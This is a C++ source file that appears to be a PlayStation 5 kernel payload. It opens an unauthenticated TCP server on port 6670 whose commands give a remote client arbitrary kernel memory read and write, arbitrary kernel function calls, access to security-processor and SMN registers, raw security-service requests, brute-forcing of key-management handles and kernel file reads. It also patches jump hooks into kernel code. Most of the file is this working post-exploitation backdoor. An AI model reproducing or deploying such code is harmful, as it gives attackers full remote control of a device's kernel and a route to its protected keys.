constexpr u32 HOST_IP_ADDR_DEFAULT = ipv4_addr_n(192, 168, 2, 2);

constexpr sockaddr_in sockaddr_ipv4(u32 addr_n, u16 port) {
  return {
      .sin_len = sizeof(sockaddr_in),
      .sin_family = AF_INET,
      .sin_port = htons(port),
      .sin_addr = {.s_addr = addr_n},
  };
}

static int host_ip_addr_set(uintptr_t uaddr) {
  if (!uaddr) {
    sym.host_ip_addr = HOST_IP_ADDR_DEFAULT;
    return 0;
  }
  sockaddr_in saddr{};
  int err = sym.copyin((void*)uaddr, &saddr, sizeof(saddr));
  if (err) {
    return err;
  }
  if (saddr.sin_len != sizeof(saddr) || saddr.sin_family != AF_INET) {
    return 22;
  }
  sym.host_ip_addr = saddr.sin_addr.s_addr;
  return 0;
}

#define SS_NBIO 0x0100

#define SBS_CANTRCVMORE 0x0020

OSTRUCT_S(sockbuf)
OSTRUCT_F(0x50, struct mtx sb_mtx);
OSTRUCT_F(0x90, short sb_state);
OSTRUCT_F(0xf0, short sb_flags);
OSTRUCT_E(sockbuf, 0x148);

OSTRUCT_S(socket)
OSTRUCT_F(0, int so_count);
OSTRUCT_F(0x10, u32 so_state);
OSTRUCT_F(0x14, int so_qstate);
OSTRUCT_F(0x30, socket* so_head);
OSTRUCT_F(0x48, TailQueueHead<socket> so_comp);
OSTRUCT_F(0x58, TailQueueEntry<socket> so_list);
OSTRUCT_F(0x68, u32 so_qlen);
OSTRUCT_F(0x74, short so_timeo);
OSTRUCT_F(0x76, u64 so_error);
OSTRUCT_F(0x88, sockbuf so_rcv);
OSTRUCT_F(0x1d0, sockbuf so_snd);
OSTRUCT_F(0x498, sbintime_t field_498);
OSTRUCT_E(socket, 0x548);

struct Uio {
  void setup(uio_rw rw, void* buf, size_t len) {
    iov.iov_base = buf;
    iov.iov_len = len;

    uio.uio_iov = &iov;
    uio.uio_iovcnt = 1;
    uio.uio_offset = 0;
    uio.uio_resid = len;
    uio.uio_segflg = UIO_SYSSPACE;
    uio.uio_rw = rw;
    uio.uio_td = curthread();
  }
  struct uio* setup_read(void* buf, size_t len) {
    setup(UIO_READ, buf, len);
    return get();
  }
  struct uio* setup_write(const void* buf, size_t len) {
    setup(UIO_WRITE, const_cast<void*>(buf), len);
    return get();
  }
  struct uio* get() {
    return &uio;
  }
  struct iovec iov {};
  struct uio uio {};
};

struct Socket {
  Socket() = default;
  Socket(const Socket& rhs) = delete;
  Socket(Socket&& rhs) = delete;
  ~Socket() { close(); }
  bool create(int type = SOCK_STREAM) {
    auto td = curthread();
    int err = sym.socreate(AF_INET, &s, type, 0, td->td_ucred, td);
    return xlate_err(err);
  }
  bool close() {
    if (!s) {
      return true;
    }
    int err = sym.soclose(s);
    s = nullptr;
    return xlate_err(err);
  }
  template <typename T>
  bool setopt(int level, int name, const T& val) {
    sockopt sopt = {
        .sopt_dir = SOPT_SET,
        .sopt_level = level,
        .sopt_name = name,
        .sopt_val = (void*)&val,
        .sopt_valsize = sizeof(T),
    };
    int err = sym.sosetopt(s, &sopt);
    return xlate_err(err);
  }
  template <typename T>
  bool setopt_socket(int name, const T& val) {
    return setopt(SOL_SOCKET, name, val);
  }
  template <typename T>
  bool setopt_tcp(int name, const T& val) {
    return setopt(IPPROTO_TCP, name, val);
  }
  bool bind(const sockaddr_in& addr) {
    auto td = curthread();
    int err = sym.sobind(s, (sockaddr*)&addr, td);
    return xlate_err(err);
  }
  bool listen(int backlog = 1) {
    auto td = curthread();
    int err = sym.solisten(s, backlog, td);
    return xlate_err(err);
  }
  // ACCEPT_LOCK
  struct AcceptMtx {
    void lock() { sym.mtx_lock(sym.accept_mtx); }
    void unlock() { sym.mtx_unlock(sym.accept_mtx); }
  } static accept_mtx;
  // SOCK_LOCK
  void lock() { sym.mtx_lock(&s->so_rcv.sb_mtx); }
  void unlock() { sym.mtx_unlock(&s->so_rcv.sb_mtx); }
  // soref
  void ref() { s->so_count++; }
  bool listen_dequeue(Socket* so) {
    // different from fbsd
    const int PSOCK = 0x58;
    const int PCATCH = 0x1000;

    int err = 0;
    std::lock_guard<AcceptMtx> accept_lock(accept_mtx);
    while (s->so_comp.empty() && s->so_error == 0) {
      if (s->so_rcv.sb_state & SBS_CANTRCVMORE) {
        s->so_error = 53;  // ECONNABORTED
        break;
      }

      // sony introduced some error/timeout tracking stuff, but under normal
      // conditions they seem to just use timeout=0 (forever), anyway...
      err = sym._sleep(&s->so_timeo, &sym.accept_mtx->lock_object,
                       PSOCK | PCATCH, "accept", 0, 0, 0);
      if (err) {
        crash();
        return xlate_err(err);
      }
    }
    if (s->so_error) {
      err = s->so_error;
      s->so_error = 0;
      return xlate_err(err);
    }

    // there's a completed connection that hasn't been accepted yet, pop it
    auto conn = so->s = s->so_comp.first;
    std::lock_guard<Socket> solock(*so);
    so->ref();
    s->so_comp.remove(conn, &socket::so_list);
    s->so_qlen--;
    conn->so_state &= ~SS_NBIO;
    conn->so_qstate &= ~0x1000;  // SQ_COMP
    conn->so_head = nullptr;
    return xlate_err(err);
  }
  bool accept(Socket* so) {
    // later versions of fbsd introduce solisten_dequeue, but ps5 lacks it.
    // unfortunately that means we need fairly invasive access to socket stuff
    // to perform something equivalent to userspace accept().
    if (!listen_dequeue(so)) {
      return false;
    }
    sockaddr* addr{};
    int err = sym.soaccept(so->s, &addr);
    sym.free(addr);
    return xlate_err(err);
  }
  bool read(void* buf, size_t len) {
    Uio uio;
    int flags = MSG_WAITALL;
    int err = sym.soreceive(s, nullptr, uio.setup_read(buf, len), nullptr,
                            nullptr, &flags);
    // disconnect is not reported in |err| for whatever reason.
    if (err || s->so_rcv.sb_state & SBS_CANTRCVMORE) {
      return false;
    }
    return true;
  }
  bool write(const void* buf, size_t len, sockaddr_in* to = nullptr) {
    Uio uio;
    int flags = (s->so_state & SS_NBIO) ? MSG_DONTWAIT : 0;
    int err = sym.sosend(s, (sockaddr*)to, uio.setup_write(buf, len), nullptr,
                         nullptr, flags, curthread());
    return xlate_err(err);
  }
  template <typename T,
            std::enable_if_t<std::is_pointer<T>::value, bool> = true>
  bool read(T obj) {
    return read(obj, sizeof(*obj));
  }
  template <typename T, size_t N>
  bool read(T (&obj)[N]) {
    return read(obj, sizeof(obj));
  }
  template <typename T>
  bool write(const T& obj) {
    return write(&obj, sizeof(T));
  }
  template <typename GccBug = void>
  bool write(const char* str) {
    return write(str, strlen(str) + 1);
  }
  void set_nonblocking() {
    std::lock_guard<Socket> solock(*this);
    s->so_state |= SS_NBIO;
  }
  bool xlate_err(int err) {
    if (err) {
      lasterr = err;
    }
    return err == 0;
  }
  socket* s{};
  int lasterr{};
};

uintptr_t call_rva(uintptr_t rva) {
  using FuncType = uintptr_t();
  auto func = (FuncType*)(sym.kernel_base + rva);
  return func();
}

template <typename T, size_t N, size_t... Idx>
uintptr_t call_rva(uintptr_t rva, T (&arg)[N], std::index_sequence<Idx...>) {
  using FuncType = uintptr_t(T...);
  auto func = (FuncType*)(sym.kernel_base + rva);
  return func(arg[Idx]...);
}

struct PcieCfgAddr {
  PcieCfgAddr(u32 bus, u32 device, u32 function)
      : bus(bus), device(device), function(function) {}
  template <typename T>
  T* reg_addr(u32 offset = 0) {
    constexpr uintptr_t MMCFG_BASE = 0xf0000000;
    auto pa =
        MMCFG_BASE | (bus << 20) | (device << 15) | (function << 12) | offset;
    return sym.pa_to_dmap<T>(pa);
  }
  u32 bus{};
  u32 device{};
  u32 function{};
};

struct IndirectRegs {
  IndirectRegs() = default;
  IndirectRegs(u32* base) {
    index = base;
    data = base + 1;
  }
  vu32* index{};
  vu32* data{};
};

struct SmnAccess {
  u32 read32(u32 addr) {
    *ind.index = addr;
    return *ind.data;
  }
  void write32(u32 addr, u32 val) {
    *ind.index = addr;
    *ind.data = val;
  }
  IndirectRegs ind{PcieCfgAddr(0, 0, 0).reg_addr<u32>(0xa0)};
};

struct Mp4Access {
  struct U64 {
    U64() = default;
    explicit U64(u32 lo, u32 hi = 0) : lo(lo), hi(hi) {}
    explicit U64(u64 val) : val(val) {}
    union {
      struct {
        u32 lo;
        u32 hi;
      };
      u64 val{};
    };
  };
  struct MboxRegs {
    vu32 *cmd{}, *arg1{}, *arg2{}, *arg3{}, *ack{};
  };
  // everything using core0
  Mp4Access() {
    mbox = {c2p_reg(0, 0), c2p_reg(0, 1), c2p_reg(0, 2), c2p_reg(0, 3),
            c2p_reg(0, 4)};
  }
  u32* c2p_reg(u32 core, u32 reg) {
    auto pa = BAR2_BASE + 0xF6000 + core * 0x5000 + reg * 0x1000;
    return sym.pa_to_dmap<u32>(pa);
  }
  bool send_cmd(u32 cmd,
                u32 arg1 = 0,
                u32 arg2 = 0,
                u32 arg3 = 0,
                u32 arg4 = 0) {
    *mbox.arg1 = arg1;
    *mbox.arg2 = arg2;
    *mbox.arg3 = arg3;
    *mbox.ack = arg4;
    std::atomic_thread_fence(std::memory_order::memory_order_seq_cst);
    *mbox.cmd = cmd;
    for (u32 i = 0; i < 0x10000; i++) {
      if (*mbox.cmd == 0) {
        return true;
      }
    }
    sym.printf("mp4 mbox timeout %08x %08x %08x %08x %08x\n", *mbox.cmd,
               *mbox.arg1, *mbox.arg2, *mbox.arg3, *mbox.ack);
    return false;
  }
  u32 read_result32() { return *mbox.arg1; }
  u32 read32(u64 addr) {
    auto addr64 = U64(addr);
    if (!send_cmd(0x20400000, addr64.lo, addr64.hi, 2)) {
      return 0;
    }
    return read_result32();
  }
  void write32(u64 addr, u32 val) {
    auto addr64 = U64(addr);
    send_cmd(0x20400003, addr64.lo, addr64.hi, val);
  }
  static constexpr uintptr_t BAR2_BASE{0xe0400000};
  MboxRegs mbox;
};

struct DfAccess {
  DfAccess() {
    auto df_func4 = PcieCfgAddr(0, 0x18, 4);
    // use fica2 (apparently not used by other stuff) via pci cfg
    const u32 fica_index = 2;
    ficaa = df_func4.reg_addr<u32>(0x50 + 4 * fica_index);
    ficad = df_func4.reg_addr<u32>(0x80 + 8 * fica_index);
  }
  // 32bit access to specific instance
  u32 make_ficaa(u32 instance, u32 function, u32 offset) {
    return ((instance & 0xff) << 16) | ((function & 0x7) << 11) |
           (offset & ~0x3) | 1;
  }
  u32 read32(u32 instance, u32 function, u32 offset) {
    *ficaa = make_ficaa(instance, function, offset);
    return *ficad;
  }
  void write32(u32 instance, u32 function, u32 offset, u32 val) {
    *ficaa = make_ficaa(instance, function, offset);
    *ficad = val;
  }
  vu32* ficaa{};
  vu32* ficad{};
};

struct RpcClient {
  enum AllocMode : u64 {
    kNormal,
    kContig,
  };
  RpcClient(Socket& s) : sock{s} {}
  bool cmd_ping() { return sock.write("pong"); }
  bool cmd_malloc() {
    struct {
      AllocMode mode;
      u64 size;
    } PACKED req{};
    struct {
      void* addr;
    } PACKED resp{};
    if (!sock.read(&req)) {
      return false;
    }
    switch (req.mode) {
    case kNormal:
      resp.addr = sym.malloc(req.size);
      break;
    case kContig:
      // XXX could use contigmalloc/contigfree instead?
      // use VM_MEMATTR_WRITE_BACK
      resp.addr = (void*)sym.kmem_alloc_contig(sym.kmem_arena, req.size, 0x102,
                                               0, 0x480000000, PAGE_SIZE, 0, 6);
      break;
    }
    return sock.write(resp);
  }
  bool cmd_free() {
    struct {
      AllocMode mode;
      void* addr;
      u64 size;
    } PACKED req{};
    if (!sock.read(&req)) {
      return false;
    }
    switch (req.mode) {
    case kNormal:
      sym.free(req.addr);
      break;
    case kContig:
      sym.kmem_free(sym.kmem_arena, (vm_offset_t)req.addr, req.size);
      break;
    }
    return true;
  }
  bool cmd_call() {
    struct {
      uintptr_t rva;
      uintptr_t num_args;
      uintptr_t args[10];
    } req{};
    struct {
      uintptr_t rv;
    } PACKED resp{};
    if (!sock.read(&req)) {
      return false;
    }
    // it would be nice to have the dispatch be templated...
    switch (req.num_args) {
    case 0:
      resp.rv = call_rva(req.rva);
      break;
#define INVOKE(n)                                                         \
  case n:                                                                 \
    resp.rv = call_rva(req.rva, req.args, std::make_index_sequence<n>{}); \
    break;
      INVOKE(1);
      INVOKE(2);
      INVOKE(3);
      INVOKE(4);
      INVOKE(5);
      INVOKE(6);
      INVOKE(7);
      INVOKE(8);
      INVOKE(9);
      INVOKE(10);
#undef INVOKE
    default:
      resp.rv = 0xdeadc0ded06ba115;
      break;
    }
    return sock.write(resp);
  }
  bool cmd_mem_read() {
    struct {
      void* addr;
      size_t len;
    } PACKED req{};
    DmapPin pin;
    if (!sock.read(&req)) {
      return false;
    }
    return sock.write(req.addr, req.len);
  }
  bool cmd_mem_write() {
    struct {
      void* addr;
      size_t len;
    } PACKED req{};
    DmapPin pin;
    if (!sock.read(&req)) {
      return false;
    }
    // XXX return something, so other side can stay in sync?
    return sock.read(req.addr, req.len);
  }
  bool cmd_runtime_info() {
    struct {
      u64 sdk_ver_ppr;
      uintptr_t kernel_base;
      void* sym_addr;
      size_t sym_size;
    } PACKED resp{
        .sdk_ver_ppr = sym.sdk_ver_ppr,
        .kernel_base = sym.kernel_base,
        .sym_addr = &sym,
        .sym_size = sizeof(sym),
    };
    return sock.write(resp);
  }
  bool cmd_vtophys() {
    struct {
      vm_offset_t va;
    } PACKED req{};
    struct {
      vm_paddr_t pa;
    } PACKED resp{};
    if (!sock.read(&req)) {
      return false;
    }
    resp.pa = sym.pmap_kextract(req.va);
    return sock.write(resp);
  }
  bool cmd_sbl_svc_req() {
    struct {
      SblMsgHeader hdr;
      int poll;
      // hdr.send_len bytes follows...
    } PACKED req{};
    struct {
      int rv;
      // req.hdr.resp_len bytes follows...
    } PACKED resp{
        .rv = 0x1337dead,
    };
    if (!sock.read(&req)) {
      return false;
    }
    auto max_len = std::max(req.hdr.send_len, req.hdr.resp_len);
    if (max_len == 0) {
      sock.write(resp);
      return true;
    }
    auto msg_buf = ScopedMalloc<u8>(max_len);
    if (!msg_buf) {
      // other side should check for this magic val before trying to read
      // response buffer
      sock.write(resp);
      return true;
    }
    if (req.hdr.send_len) {
      if (!sock.read(msg_buf.get(), req.hdr.send_len)) {
        return false;
      }
    }
    resp.rv =
        sym.sblServiceRequest(&req.hdr, msg_buf.get(), msg_buf.get(), req.poll);
    if (!sock.write(resp)) {
      return false;
    }
    // on success, resp_len is updated
    if (!sock.write(req.hdr.resp_len)) {
      return false;
    }
    if (req.hdr.resp_len) {
      if (!sock.write(msg_buf.get(), req.hdr.resp_len)) {
        return false;
      }
    }
    return true;
  }
  bool cmd_smn_read() {
    struct {
      u32 addr;
      u32 count;
      u32 increment;
    } PACKED req{};
    struct {
      u32 status;
    } PACKED resp{
        .status = 0x1337dead,
    };
    if (!sock.read(&req)) {
      return false;
    }
    const auto buf_len = req.count * sizeof(u32);
    auto buf = ScopedMalloc<u32>(buf_len);
    if (!buf) {
      sock.write(resp);
      return true;
    }
    SmnAccess smn;
    for (u32 src_i = 0, dst_i = 0; dst_i < req.count;
         dst_i++, src_i += req.increment) {
      buf.get()[dst_i] = smn.read32(req.addr + src_i);
    }
    resp.status = 0;
    if (!sock.write(resp)) {
      return false;
    }
    return sock.write(buf.get(), buf_len);
  }
  bool cmd_smn_write() {
    struct {
      u32 addr;
      u32 count;
      u32 increment;
    } PACKED req{};
    struct {
      u32 status;
    } PACKED resp{
        .status = 0x1337dead,
    };
    if (!sock.read(&req)) {
      return false;
    }
    const auto buf_len = req.count * sizeof(u32);
    auto buf = ScopedMalloc<u32>(buf_len);
    if (!buf) {
      sock.write(resp);
      return true;
    }
    if (!sock.read(buf.get(), buf_len)) {
      return false;
    }
    SmnAccess smn;
    for (u32 src_i = 0, dst_i = 0; src_i < req.count;
         src_i++, dst_i += req.increment) {
      smn.write32(req.addr + dst_i, buf.get()[src_i]);
    }
    resp.status = 0;
    return sock.write(resp);
  }
  bool cmd_mp4_read() {
    struct {
      u32 addr;
      u32 count;
      u32 increment;
    } PACKED req{};
    struct {
      u32 status;
    } PACKED resp{
        .status = 0x1337dead,
    };
    if (!sock.read(&req)) {
      return false;
    }
    const auto buf_len = req.count * sizeof(u32);
    auto buf = ScopedMalloc<u32>(buf_len);
    if (!buf) {
      sock.write(resp);
      return true;
    }
    Mp4Access mp4;
    for (u32 src_i = 0, dst_i = 0; dst_i < req.count;
         dst_i++, src_i += req.increment) {
      buf.get()[dst_i] = mp4.read32(req.addr + src_i);
    }
    resp.status = 0;
    if (!sock.write(resp)) {
      return false;
    }
    return sock.write(buf.get(), buf_len);
  }
  bool cmd_mp4_write() {
    struct {
      u32 addr;
      u32 count;
      u32 increment;
    } PACKED req{};
    struct {
      u32 status;
    } PACKED resp{
        .status = 0x1337dead,
    };
    if (!sock.read(&req)) {
      return false;
    }
    const auto buf_len = req.count * sizeof(u32);
    auto buf = ScopedMalloc<u32>(buf_len);
    if (!buf) {
      sock.write(resp);
      return true;
    }
    if (!sock.read(buf.get(), buf_len)) {
      return false;
    }
    Mp4Access mp4;
    for (u32 src_i = 0, dst_i = 0; src_i < req.count;
         src_i++, dst_i += req.increment) {
      mp4.write32(req.addr + dst_i, buf.get()[src_i]);
    }
    resp.status = 0;
    return sock.write(resp);
  }
  bool cmd_df_access() {
    struct {
      u32 rw;
      u32 instance;
      u32 function;
      u32 offset;
      u32 val;
    } PACKED req{};
    struct {
      u32 val;
    } PACKED resp{};
    if (!sock.read(&req)) {
      return false;
    }
    DfAccess df;
    switch (req.rw) {
    case 0:
      resp.val = df.read32(req.instance, req.function, req.offset);
      break;
    case 1:
      df.write32(req.instance, req.function, req.offset, req.val);
      break;
    default:
      resp.val = 0x1337dead;
      break;
    }
    return sock.write(resp);
  }
  bool cmd_brute_key_handle() {
    u16 handle_lo;
    if (!sock.read(&handle_lo)) {
      return false;
    }

    u32 key_handle = ~0u;
    for (u32 handle_hi = 0; handle_hi < 1 << 16; handle_hi++) {
      SblMsgHeader hdr{};
      KmsMail mail{.hdr = {.func_id = kClearKeyHandle}};
      hdr.cmd = 6;
      hdr.handle = 5;
      hdr.send_len = hdr.resp_len = sizeof(mail);

      auto& clear = mail.clear_key_handle;
      clear.handle = (handle_hi << 16) | handle_lo;
      int rv = sym.sblServiceRequest(&hdr, &mail, &mail, 0);
      if (!rv && !mail.hdr.status) {
        sym.printf("found key handle %08x\n", clear.handle);
        key_handle = clear.handle;
        break;
      }
    }
    return sock.write(key_handle);
  }
  bool cmd_vn_rw() {
    struct {
      u8 is_write;
      u16 name_len;
      int flags;
      int len;
      u64 offset;
    } PACKED req{};
    struct {
      u32 status;
      ssize_t resid;
    } PACKED resp{
        .status = 0x1337dead,
    };

    struct nameidata nd {};

    if (!sock.read(&req)) {
      return false;
    }

    // actually lets not allow dangerous stuff for now
    if (req.is_write || req.name_len > 0xf000) {
      return sock.write(resp);
    }

    auto name = ScopedMalloc<char>(req.name_len + 1);
    auto buf = ScopedMalloc<u8>(req.len);
    if (!name || !buf) {
      return sock.write(resp);
    }

    if (!sock.read(name.get(), req.name_len)) {
      return false;
    }
    name.get()[req.name_len] = '\0';

    auto td = curthread();
    sym.NDINIT_ALL(&nd, 0, 0x40, UIO_SYSSPACE, name.get(), -100, nullptr,
                   nullptr, td);
    int flags = req.flags;
    int err = sym.vn_open(&nd, &flags, 0, nullptr);
    if (err) {
      resp.status = err;
      return sock.write(resp);
    }
    sym.NDFREE(&nd, ~0x20);

    uio_rw rw = req.is_write ? UIO_WRITE : UIO_READ;
    ssize_t resid{};
    err = sym.vn_rdwr(rw, nd.ni_vp, buf.get(), req.len, req.offset,
                      UIO_SYSSPACE, 0, td->td_ucred, nullptr, &resid, td);
    sym.vn_close(nd.ni_vp, req.flags, td->td_ucred, td);
    resp.status = err;
    resp.resid = resid;
    if (err) {
      return sock.write(resp);
    }

    if (!sock.write(resp)) {
      return false;
    }
    return sock.write(buf.get(), req.len);
  }
  bool run() {
    bool ok = true;
    while (ok) {
      u32 cmd;
      ok = sock.read(&cmd);
      if (!ok) {
        break;
      }
      // this is a big switch instead of function table because x86 gcc
      // generates crashing PIC code if table is used...
      switch (cmd) {
      case 0:
        return true;
      case 1:
        ok = cmd_ping();
        break;
      case 2:
        ok = cmd_malloc();
        break;
      case 3:
        ok = cmd_free();
        break;
      case 4:
        ok = cmd_call();
        break;
      case 5:
        ok = cmd_mem_read();
        break;
      case 6:
        ok = cmd_mem_write();
        break;
      case 7:
        ok = cmd_runtime_info();
        break;
      case 8:
        ok = cmd_vtophys();
        break;
      case 9:
        ok = cmd_sbl_svc_req();
        break;
      case 10:
        ok = cmd_smn_read();
        break;
      case 11:
        ok = cmd_smn_write();
        break;
      case 12:
        ok = cmd_mp4_read();
        break;
      case 13:
        ok = cmd_mp4_write();
        break;
      case 14:
        ok = cmd_df_access();
        break;
      case 15:
        ok = cmd_brute_key_handle();
        break;
      /*
      case 16:
        ok = cmd_mp1_read();
        break;
      case 17:
        ok = cmd_mp1_write();
        break;
      case 18:
        ok = cmd_mp1_dump_sram();
        break;
      //*/
      case 19:
        ok = cmd_vn_rw();
        break;
      default:
        sym.printf("rpc: unknown cmd %x\n", cmd);
        ok = false;
        break;
      }
    }
    return false;
  }
  Socket& sock;
};

static bool tcp_server() {
  Socket server;
  if (!server.create()) {
    return false;
  }
  if (!server.setopt_socket<int>(SO_REUSEADDR, 1)) {
    return false;
  }
  if (!server.bind(sockaddr_ipv4(INADDR_ANY, 6670))) {
    return false;
  }
  if (!server.listen()) {
    return false;
  }

  sym.printf("%s\n", "server started");

  bool exiting = false;
  while (!exiting) {
    Socket client;
    // TODO there is some bug where after the first accept completes, we no
    // longer get udp log msgs. Logging is restored on the _next_ tcp_server run
    // while waiting for accept, but not before (just closing/reopening |server|
    // socket doesn't fix it). sockets generally still work, just some logging
    // issue.
    if (!server.accept(&client)) {
      return false;
    }

    // XXX the client is blocking. could handle on a thread if needed.
    RpcClient rpc(client);
    exiting = rpc.run();
  }
  return true;
}

// 0x85400000 = 0x5F000000 on salina
// uart0: 0x26000, uart1: 0x27000
// uart0 is used by EMC by default, uart1 would be used by cpbox, but inactive
// on retail config we piggyback on uart0 since the uart1 hw isn't initialized
OSTRUCT_S(SalinaUartRegs)
OSTRUCT_F(0x00, vu8 rbr_thr);
OSTRUCT_F(0x14, vu8 lsr);
OSTRUCT_E(SalinaUartRegs, 0x100);

static void uart_wait_tx_holding_empty(const SalinaUartRegs& uart) {
  while ((uart.lsr & 0x20) == 0) {
  }
}

static void uart_write(const void* buf, size_t len) {
  auto uart = sym.pa_to_dmap<SalinaUartRegs>(0x85400000 + 0x26000);
  auto b = (const u8*)buf;
  // NOTE the lock only ensures whatever buffer fbsd has passed gets written
  // atomically. fbsd may still pass partial lines of text, resulting in ugly
  // output
  std::lock_guard<ShitLock> lock(sym.uart_lock);
  while (len--) {
    uart_wait_tx_holding_empty(*uart);
    uart->rbr_thr = *b++;
  }
}

static constexpr bool use_udp_logging() {
  return false;
}

static void log_kick(void* msg, size_t len) {
  if (use_udp_logging()) {
    Socket sock;
    if (!sock.create(SOCK_DGRAM)) {
      return;
    }
    sock.set_nonblocking();
    sock.setopt_socket<int>(SO_REUSEADDR, 1);
    sock.bind(sockaddr_ipv4(INADDR_ANY, 6670));
    auto log_addr = sockaddr_ipv4(sym.host_ip_addr, 6671);
    sock.write(msg, len, &log_addr);
  } else {
    uart_write(msg, len);
  }
}

static void hook_putchar(int c, void* arg) {
  char msg = c;
  log_kick(&msg, sizeof(msg));
}

static void hook_msgbuf_addstr(void* mbp, int pri, char* str, int filter_cr) {
  log_kick(str, strlen(str) + 1);
}

static bool hook_install_near(uintptr_t thunk, uintptr_t target) {
  struct PACKED jmp_t {
    u8 op[1];
    s32 imm;
  };
  ASSERT_STRUCT_SIZE(jmp_t, 5);

  auto disp = target - (thunk + sizeof(jmp_t));
  u32 disp_hi = disp >> 32;
  if (!(disp_hi == 0u || disp_hi == ~0u)) {
    log("hook oob\n");
    return false;
  }

  jmp_t jmp = {
      .op = {0xe9},
      .imm = (s32)disp,
  };

  modify_code([&] {
    auto val = *(u64*)thunk;
    memcpy(&val, &jmp, sizeof(jmp));
    *(u64*)thunk = val;
  });
  return true;
}

// NOTE: this uses jmp [rip + 0], and therefor reads the absolute target addr
// from directly after the thunk. It seems this may cause NDA fault?
static void hook_install_far(uintptr_t thunk, uintptr_t target) {
  struct PACKED jmp_t {
    u8 op[2];
    s32 imm;
    uintptr_t addr;
  };
  ASSERT_STRUCT_SIZE(jmp_t, 14);

  jmp_t jmp = {
      .op = {0xff, 0x25},
      .imm = 0,
      .addr = target,
  };

  modify_code([&] {
    // this is unsafe (not atomic)
    *(jmp_t*)thunk = jmp;
  });
}
